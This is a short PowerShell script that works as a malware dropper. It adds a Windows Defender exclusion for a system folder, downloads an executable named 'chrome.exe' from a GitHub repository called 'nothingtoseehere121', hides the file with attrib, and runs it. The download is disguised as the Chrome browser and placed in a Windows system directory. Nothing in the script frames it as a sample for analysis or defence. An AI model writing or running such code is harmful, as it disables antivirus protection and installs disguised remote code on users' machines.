$Folder = 'C:\Windows\System32\Microsoft\Windows_System32.exe'
"Test to see if folder [$Folder]  exists"
if (Test-Path -Path $Folder) {
    "Path exists!"
    C:\Windows\System32\Microsoft\chrome.exe
} else {
    "Path doesn't exist."
    Add-MpPreference -ExclusionPath "C:\Windows\System32\Microsoft" ; cd C:\Windows\System32\Microsoft ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/chrome.exe" -OutFile chrome.exe ; attrib +h chrome.exe; C:\Windows\System32\Microsoft\chrome.exe
}
